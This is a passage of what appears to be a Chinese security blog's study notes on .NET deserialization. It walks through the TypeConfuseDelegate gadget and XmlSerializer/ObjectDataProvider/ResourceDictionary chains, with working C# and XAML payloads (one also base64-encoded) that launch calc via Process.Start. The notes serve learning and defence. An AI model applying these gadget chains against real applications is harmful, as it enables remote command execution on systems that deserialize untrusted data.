id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>会看yso中的构造链</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br></pre></td></tr></table></figure><p>跟进Comparison函数</p><p><img src="../images/image-20240226101018984.png" alt="image-20240226101018984"></p><p>是一个委派函数 </p><p><img src="../images/image-20240226101347624.png" alt="image-20240226101347624"></p><p>这个就是创建了两个Compare函数  </p><p><img src="../images/image-20240226101415467.png" alt="image-20240226101415467"></p><p>而<code>Comparer&lt;T&gt;</code>抽象类实现了<code>IComparer&lt;T&gt;</code>接口 </p><p><img src="../images/image-20240226101439662.png" alt="image-20240226101439662"></p><p>那么这个Create就是创建了实现了 IComparer接口  并有两个Compare方法的一个类   并且放入列表中</p><p>然后又因为我们委派的是Comparison函数</p><p><img src="../images/image-20240226101838201.png" alt="image-20240226101838201"></p><p>如果我们将Process.Start设置为比较器，那么向集合中添加的值就是Process.Start的参数，由此来进行命令执行。在委托中我们提到，委托的方法签名和委托必须一致，而对于<code>SortedSet&lt;string&gt;</code>类来说，其比较函数类型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int Comparison&lt;in T&gt;(T x, T y);</span><br></pre></td></tr></table></figure><p>但是而Process.Start()的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Process Start(string fileName, string arguments);</span><br></pre></td></tr></table></figure><p>返回类型不一致  一个是Process，一个是int   这样就会导致反序列化失败   那么我们就得借助多播委派来解决这个问题了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个string的比较器</span></span><br><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line"><span class="comment">// 用两个string的比较器合并为一个多播委托(生成两个Compare函数)</span></span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line"><span class="comment">// Create()函数返回new ComparisonComparer&lt;T&gt;(d) (生成一个类)</span></span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line"><span class="comment">// 将ComparisonComparer赋值给SortedSet的比较器</span></span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line"><span class="comment">// set.Add(&quot;cmd.exe&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdFileName);</span><br><span class="line"><span class="comment">// set.Add(&quot;calc&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdArguments);</span><br><span class="line"><span class="comment">// 反射修改_invocationList</span></span><br><span class="line">FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line"><span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line"><span class="comment">// 修改_invocationList 添加 Process::Start(string, string) 修改第二个Compare函数为Process.Start</span></span><br><span class="line">invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">string</span>, Process&gt;(Process.Start);</span><br><span class="line">fi.SetValue(d, invoke_list);</span><br></pre></td></tr></table></figure><p>那么为什么多播委派能解决这个签名不一致的问题   原作者给出的解释</p><blockquote><p>The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.</p></blockquote><p>简单来讲就是 多播委托传递的是指针</p><p>先在SortedSet中触发OnDeserialization函数   然后调用Add方法</p><p><img src="../images/image-20240226103010401.png" alt="image-20240226103010401"></p><p>跟进add方法后 发现会多次调用我们的Compare方法   但是Compare方法已经被我们反射修改为Process.Start(string,string)</p><p><strong>(准确来说是第二次  因为我们是修改第二个Compare方法)</strong></p><p><img src="../images/image-20240226102833194.png" alt="image-20240226102833194"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/&quot;&gt;ht</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-02</title>
    <link href="https://ke1nys.github.io/posts/3df24b8d.html"/>
    <id>https://ke1nys.github.io/posts/3df24b8d.html</id>
    <published>2024-02-22T08:45:58.000Z</published>
    <updated>2024-02-26T13:07:35.444Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p><p><a href="https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/">https://boogipop.com/2024/02/06/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20XmlSerializer%20Deserialization%2002/</a></p><h2 id="XmlSerializer"><a href="#XmlSerializer" class="headerlink" title="XmlSerializer"></a>XmlSerializer</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlElement</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">XmlArray(<span class="string">&quot;Items&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> Order[] OrderedItems;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Order</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> OrderID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            p.Age = <span class="number">12</span>;</span><br><span class="line">            Order order = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">123</span>;</span><br><span class="line">            Order order1 = <span class="keyword">new</span> Order();</span><br><span class="line">            order.OrderID = <span class="number">456</span>;</span><br><span class="line">            Order[] orders = <span class="keyword">new</span> Order[] &#123; order, order1 &#125;;</span><br><span class="line">            p.OrderedItems = orders;</span><br><span class="line">            p.ClassName = <span class="string">&quot;classname&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            XmlSerializer xmlSerializer = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            xmlSerializer.Serialize(writer, p);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出xml</span></span><br><span class="line">            Console.WriteLine(Encoding.UTF8.GetString(memoryStream.ToArray()));</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            Person p1 = (Person)xmlSerializer.Deserialize(memoryStream);</span><br><span class="line">            Console.WriteLine(p1.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xml里的参数其实问题不大  重点是关注序列化想要的条件</p><ul><li>序列化类需要是public</li><li>需要个writer 将序列化的数据写入内存流中</li><li>XmlSerializer 得传参进去  参数是序列化类的类型</li></ul><p>(不加的就是以二进制的形式进行传输  就是.bin文件)</p><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Person xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; ClassName=&quot;classname&quot;&gt;</span><br><span class="line">  &lt;Items&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;456&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">    &lt;Order&gt;</span><br><span class="line">      &lt;OrderID&gt;0&lt;/OrderID&gt;</span><br><span class="line">    &lt;/Order&gt;</span><br><span class="line">  &lt;/Items&gt;</span><br><span class="line">  &lt;Age&gt;12&lt;/Age&gt;</span><br><span class="line">  &lt;Name&gt;jack&lt;/Name&gt;</span><br><span class="line">&lt;/Person&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他会将我们的对象Object序列化为Xml文本格式，之后反序列化的话就会转换回Person类。<br>上述memory流对象在序列化后position会蹦到文件的末尾，我们需要给他调整为0再进行反序列化才行</p><h2 id="ObjectDataProvider"><a href="#ObjectDataProvider" class="headerlink" title="ObjectDataProvider"></a>ObjectDataProvider</h2><p>这个类我们在01的时候介绍过  其就是可以直接调用到Process然后执行命令</p><p>(刚开始直接用的时候会报错  得导入包才行)</p><p><img src="../images/image-20240224210637750.png" alt="image-20240224210637750"></p><p>刚开始这里的时候会报错  说找不到这个包  <code>ObjectDataProvider</code>就是在这个里面的  所以我们要手动导入一下</p><p><img src="../images/image-20240224210801745.png" alt="image-20240224210801745"></p><p>选择 PresentationFramework依赖  并且添加进去</p><p><img src="../images/image-20240224211000138.png" alt="image-20240224211000138"></p><p>回到正轨上   当我们直接执行上述代码时  calc命令是能直接执行成功  但是xml内容却不会输出出来</p><p><img src="../images/image-20240224211145982.png" alt="image-20240224211145982"></p><p>其实就是因为我们在初始化<code>XmlSerializer</code>这个类的时候  确定的类型是<code>ObjectDataProvider</code></p><p>但在序列化的时候却识别不出来<code>ObjectDataProvider</code>  所以就会导致报错  这样的话就不能反序列化执行了</p><p>我们可以使用<code>ExpandedWrapper</code>类来解决这个问题  </p><p><img src="../images/image-20240224212028497.png" alt="image-20240224212028497"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Data.Services.Internal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">XmlRoot</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">XmlAttribute</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ClassName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Evil</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Process process = <span class="keyword">new</span> Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.Start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            TextWriter writer = <span class="keyword">new</span> StreamWriter(memoryStream);</span><br><span class="line">            ExpandedWrapper&lt;Person, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;Person, ObjectDataProvider&gt;();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodName = <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            expandedWrapper.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> Person();</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;Person, ObjectDataProvider&gt;));</span><br><span class="line">            xml.Serialize(writer, expandedWrapper);</span><br><span class="line">            <span class="built_in">string</span> result = Encoding.UTF8.GetString(memoryStream.ToArray());</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            xml.Deserialize(memoryStream);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是拿ExpandedWrapper这个类来进行包装  本质不变  变得就是这个Person里的Evil方法是我们手动添加的  但是在实际环境中是没有这种东西的   那么接下来我们就引出ResourceDictionary这个类</p><p>(其实看到这里这里就会发现ObjectDataProvider是可以调用任意类的任意方法的)</p><h2 id="ResourceDictionary"><a href="#ResourceDictionary" class="headerlink" title="ResourceDictionary"></a>ResourceDictionary</h2><p>ResourceDictionary即资源字典，用于wpf开发，既然是wpf，肯定涉及到xaml语言。先来看利用ResourceDictionary执行命令的一个payload。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary </span><br><span class="line">                    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span> </span><br><span class="line">                    xmlns:d=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span> </span><br><span class="line">                    xmlns:b=<span class="string">&quot;clr-namespace:System;assembly=mscorlib&quot;</span> </span><br><span class="line">                    xmlns:c=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=system&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider d:Key=<span class="string">&quot;&quot;</span> ObjectType=<span class="string">&quot;&#123;d:Type c:Process&#125;&quot;</span> MethodName=<span class="string">&quot;Start&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">            &lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">            &lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p>生成Demo(不是上诉payload的Demo  只是演示一下是咋生成的)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> name = <span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">        <span class="comment">// private int age = 114;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">XmlDeserialize</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            <span class="keyword">var</span> psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            <span class="comment">// 去掉多余的环境变量</span></span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            <span class="keyword">var</span> p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            objectDataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;/c calc.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.ObjectInstance = p;</span><br><span class="line">            <span class="keyword">var</span> resourceDictionary = <span class="keyword">new</span> ResourceDictionary();</span><br><span class="line">            resourceDictionary[<span class="string">&quot;a&quot;</span>] = objectDataProvider;</span><br><span class="line">            <span class="keyword">var</span> payload = XamlWriter.Save(resourceDictionary);</span><br><span class="line">            Console.WriteLine(payload);</span><br><span class="line">            XamlReader.Parse(payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下这段xaml：</p><ol><li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li><li>d:Key=”” 起别名为空，在xaml语法中，Key这个键值必须有。</li><li>ObjectType表示对象类型</li><li>d:Type 等同于typeof()</li><li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li><li>c:Process 等同于System.Diagnostics.Process</li></ol><p>整个xaml被解析之后，等同于创建了一个ObjectDataProvider对象，该对象又会自动调用<code>System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c calc&quot;)</code></p><p>因为是xaml的语言，我们使用XamlReader.Parse()来解析它</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//这里的base64就是上面xml的payload</span></span><br><span class="line">            <span class="built_in">string</span> p = <span class="string">&quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;</span>;</span><br><span class="line">            <span class="built_in">byte</span>[] vs = Convert.FromBase64String(p);</span><br><span class="line">            <span class="built_in">string</span> xml = Encoding.UTF8.GetString(vs);</span><br><span class="line">            XmlDeserialize(xml);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XmlDeserialize</span>(<span class="params"><span class="built_in">string</span> o</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            XamlReader.Parse(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时相当于我们利用XamlReader.Parse()进行了进一步利用，对于xmlserializer来说攻击链从原来的</p><ul><li>ObjectDataProvider -&gt; 